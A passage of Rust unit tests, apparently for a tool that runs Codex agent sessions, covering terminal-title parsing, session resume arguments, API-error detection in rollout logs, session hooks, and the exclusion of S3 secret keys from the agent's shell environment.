            assert_eq!((agent["agent_status"].as_str(), agent.get(ASKS_KEY)), (Some("blocked"), None), "{title}: tui/src/chatwidget/status_surfaces.rs blinks between both prefixes");
        }
        let working = with_question(json!({ "agent": "codex", "pane_id": "w1:p1", "agent_status": "idle", "terminal_title": "⠋ Fix the flaky checkout test | wt1.app" }), || false, |_| None);
        assert_eq!(working["agent_status"].as_str(), Some("idle"));
        let claude = with_question(json!({ "agent": "claude", "pane_id": "w1:p1", "agent_status": "idle", "terminal_title": "[ ! ] Action Required | x | y" }), || false, |_| None);
        assert_eq!(claude["agent_status"].as_str(), Some("idle"), "only Codex titles itself so");
        assert_eq!(waits_on("[ ! ] Action Required | x | y", || panic!("a view is read from the title alone"), || None), Some(Waits::OnView));
        assert_eq!(waits_on("x | y", || true, || Some(UPDATE.to_string())), Some(Waits::OnStartUp(Started::AwaitsUpdate)));
        assert_eq!(waits_on("x | y", || false, || panic!("a Codex past its first prompt has no screen read for start-up questions")), None);
    }

    #[test]
    fn a_codex_task_that_reads_the_vault_keys_from_its_environment_names_them_only_to_keep_them_from_its_commands() {
        let hidden = crate::agent::codex_setup::hide_args(&toml::Table::new(), &["S3_ACCESS_KEY".to_string(), "S3_SECRET_KEY".to_string()]);
        let args = start_args(None, &profile(None, None), &super::super::TaskFiles { hidden: &hidden, ..files(true, None, &[]) }, &Session::Resume("019b".to_string()));
        assert!(after(&args, "-c").contains(&"shell_environment_policy.filters.S3_SECRET_KEY=\"exclude\""), "{args:?}");
        assert_eq!(args.last().map(String::as_str), Some("019b"), "the session id stays last");
        assert!(!lacks_role(&args) && crate::agent::Agent::Codex.resume_args(&std::iter::once("codex".to_string()).chain(args.iter().skip(1).cloned()).collect::<Vec<_>>(), "019b").unwrap().iter().any(|arg| arg.contains("S3_SECRET_KEY")), "a restart keeps the exclude with the rest of its flags");
    }

    #[test]
    fn the_codex_sessions_kebbie_starts_title_their_terminal_with_codexs_default_items() {
        let args = start_args(None, &profile(None, None), &files(true, None, &[]), &Session::New("x".to_string()));
        assert!(after(&args, "-c").contains(&"tui.terminal_title=[\"activity\",\"thread-name\",\"project-name\"]"), "config/src/types.rs: when unset the TUI shows activity, thread-name and project-name; a user's own list would hide Action Required or the thread title: {args:?}");
        let parsed: toml::Table = TITLE_ITEMS.replacen("tui.terminal_title=", "items = ", 1).parse().unwrap();
        assert_eq!(parsed["items"].as_array().map(Vec::len), Some(3), "the value parses as a TOML list");
        let restarted = with_role(&with_role(&args));
        assert_eq!(restarted.iter().filter(|word| *word == TITLE_ITEMS).count(), 1, "a restart keeps it once: {restarted:?}");
    }

    #[test]
    fn codexs_terminal_title_gives_the_task_its_thread_title_alone() {
        for (title, thread) in [
            ("[ ! ] Action Required | Fix the flaky checkout test | wt1.app", Some("Fix the flaky checkout test")),
            ("[ . ] Action Required | Fix the flaky checkout test | wt1.app", Some("Fix the flaky checkout test")),
            ("⠋ Fix the flaky checkout test | wt1.app", Some("Fix the flaky checkout test")),
            ("Fix the flaky checkout test ⠙ | wt1.app", Some("Fix the flaky checkout test")),
            ("Fix the flaky checkout test | wt1.app", Some("Fix the flaky checkout test")),
            ("Rows | columns | wt1.app", Some("Rows | columns")),
            ("[ ! ] Action Required | wt1.app", None),
            ("⠋ wt1.app", None),
            ("⠋ ⠙ | wt1.app", None),
            ("wt1.app", None),
        ] {
            assert_eq!(thread_title(title).as_deref(), thread, "{title}: the default items are activity, thread-name and project-name (tui/src/chatwidget/status_surfaces.rs)");
        }
        assert!(requires_action("[ ! ] Action Required | x | y") && !requires_action("Action Required | x | y"));
        assert_eq!(kept_thread_title("Action Required | Fix the flaky checkout test | wt1.app"), Some(Some("Fix the flaky checkout test".to_string())), "a kept title loses its [ ! ] to readable()");
        assert_eq!(kept_thread_title("Action Required | wt1.app"), Some(None));
        assert_eq!(kept_thread_title("Fix the flaky checkout test"), None, "any other kept title stays as it is");
        assert_eq!(kept_thread_title("Action Required banner on settings page"), None, "a Claude title that opens with the same words is no Codex title");
    }

    #[test]
    fn a_turn_codex_ended_on_an_api_error_is_read_from_its_task_complete_with_the_apis_own_words() {
        let failed = r#"{"timestamp":"2026-10-31T14:40:02.000Z","type":"event_msg","payload":{"type":"task_complete","turn_id":"t1","last_agent_message":null,"error":{"message":"unexpected status 400 Bad Request: {\"type\":\"error\",\"status\":400,\"error\":{\"type\":\"invalid_request_error\",\"message\":\"The 'gpt-5.1-codex-max' model is not supported when using Codex with a ChatGPT account.\",\"code\":\"model_not_found\"}}, url: https://chatgpt.com/backend-api/codex/responses","codex_error_info":{"http_connection_failed":{"http_status_code":400}}}}}"#;
        let rollout = [ROLLOUT.lines().next().unwrap(), r#"{"timestamp":"2026-10-31T14:40:00.000Z","type":"event_msg","payload":{"type":"user_message","message":"add the hub's leave message","images":[]}}"#, failed].join("\n");
        let tail = observe(&rollout);
        let failure = tail.failure.clone().expect("the error stops the turn");
        assert_eq!(failure.id, "t1");
        assert_eq!(failure.error, crate::recover::ApiError::Fatal { kind: "a model that is not available", text: "The 'gpt-5.1-codex-max' model is not supported when using Codex with a ChatGPT account.".to_string() });
        let crate::recover::Act::Stop(stuck) = crate::recover::decide("hub-leave-message@kebbie", None, &tail, failure.at, None) else { panic!("a Codex error is never resumed") };
        assert_eq!(stuck.note_at(failure.at, &|_| 0), "stopped by a model that is not available: The 'gpt-5.1-codex-max' model is not supported when using Codex with a ChatGPT account.");
        assert_eq!(observe(&format!("{rollout}\n{}", r#"{"timestamp":"2026-10-31T14:41:00.000Z","type":"event_msg","payload":{"type":"user_message","message":"use gpt-5.5","images":[]}}"#)).failure, None, "a new prompt after it ends the episode");
        let done = r#"{"timestamp":"2026-10-31T14:42:00.000Z","type":"event_msg","payload":{"type":"task_complete","turn_id":"t2","last_agent_message":"Done."}}"#;
        let replied = observe(&format!("{rollout}\n{done}"));
        assert!(replied.failure.is_none() && replied.replied);
        assert_eq!(error_kind(&json!("usage_limit_exceeded"), "You've hit your usage limit."), "the usage limit");
        assert_eq!(error_kind(&json!({ "http_connection_failed": { "http_status_code": 502 } }), "unexpected status 502"), "a server error");
        assert_eq!(short_error("stream disconnected before completion, url: https://x"), "stream disconnected before completion");
    }

    #[test]
    fn a_restarted_codex_keeps_its_flags_and_resumes_its_own_session() {
        let argv: Vec<String> = ["/Users/ada/.local/bin/codex", "resume", "--sandbox", "workspace-write", "-c", "plugins.kebbie@kebbie.enabled=true", "--last", "old-id"].map(str::to_string).to_vec();
        assert_eq!(crate::agent::Agent::Codex.resume_args(&argv, "new-id").unwrap(), ["resume", "--sandbox", "workspace-write", "-c", "plugins.kebbie@kebbie.enabled=true", "new-id"]);
        assert!(crate::agent::Agent::Codex.resume_args(&["codex".to_string(), "--frobnicate".to_string()], "x").unwrap_err().contains("--frobnicate"));
        assert!(crate::agent::Agent::Codex.resume_args(&["claude".to_string()], "x").unwrap_err().contains("not codex"));
        let piped: Vec<String> = ["codex", "--sandbox", "workspace-write", "-"].map(str::to_string).to_vec();
        assert_eq!(crate::agent::Agent::Codex.resume_args(&piped, "new-id").unwrap(), ["resume", "--sandbox", "workspace-write", "new-id"], "a lone - is Codex's prompt word, as it is Claude's");
        assert!(lacks_role(&argv), "an old trust entry does not count");
        let fixed = with_role(&argv[1..]);
        assert!(!lacks_role(&fixed) && fixed.last().map(String::as_str) == Some("old-id"), "{fixed:?}");
        assert_eq!(fixed.iter().filter(|word| *word == "plugins.kebbie@kebbie-tasks.enabled=true").count(), 1);
        assert!(!fixed.iter().any(|word| word == "plugins.kebbie@kebbie.enabled=true"), "kebbie@kebbie, which a repo's marketplace replaces, goes: {fixed:?}");
    }

    #[test]
    fn the_session_start_hook_records_the_session_and_gives_the_role_whole() {
        let roles = crate::sh::test_dir("codex-roles");
        std::fs::write(roles.join("billing@app.md"), "# Your role\n\nReport before you stop.\n").unwrap();
        let said: Value = serde_json::from_str(&session_start("billing@app", &Payload::parse("{}"), Some(&roles))).unwrap();
        assert_eq!(said["hookSpecificOutput"]["hookEventName"], "SessionStart");
        assert_eq!(said["hookSpecificOutput"]["additionalContext"], "# Your role\n\nReport before you stop.\n");
        assert_eq!(session_start("other@app", &Payload::parse("{}"), Some(&roles)), "", "no role file, no context");
        std::fs::remove_dir_all(roles).unwrap();
    }

    #[test]
    fn a_hook_outside_a_kebbie_task_says_nothing() {
        let outside = crate::sh::test_dir("codex-outside");
        for event in ["SessionStart", "UserPromptSubmit", "Stop"] {
            let input = json!({ "hook_event_name": event, "cwd": outside, "session_id": "s", "stop_hook_active": false }).to_string();
            assert_eq!(hook(&input), "", "{event}");
        }
        assert_eq!(hook("not json"), "");
        std::fs::remove_dir_all(outside).unwrap();
    }

    #[test]
    fn doctor_names_what_in_the_users_config_turns_kebbies_hooks_off() {
        assert!(hooks_blocked(None).is_empty());
        assert!(hooks_blocked(Some(&"model = \"x\"\n".parse().unwrap())).is_empty());
        let off: toml::Table = "[features]\nhooks = false\n[hooks.state.\"kebbie@kebbie-tasks:hooks/hooks.json:stop:0:0\"]\nenabled = false\n".parse().unwrap();
        assert_eq!(hooks_blocked(Some(&off)), ["[features] hooks = false turns every hook off", "its Stop hook is turned off in /hooks"]);
    }

    #[test]
    fn availability_names_the_binary_its_version_and_the_plugin() {
        let shown = Availability { binary: Some(PathBuf::from("/u/.local/bin/codex")), version: Some("codex-cli 0.163.0".to_string()), plugin: Installed::Current }.line();
        assert_eq!(shown, "codex-cli 0.163.0 at /u/.local/bin/codex · kebbie's plugin installed");
        assert_eq!(Availability { binary: None, version: None, plugin: Installed::Missing }.line(), "codex is not on PATH · kebbie's plugin not installed: kebbie setup codex");
    }
}
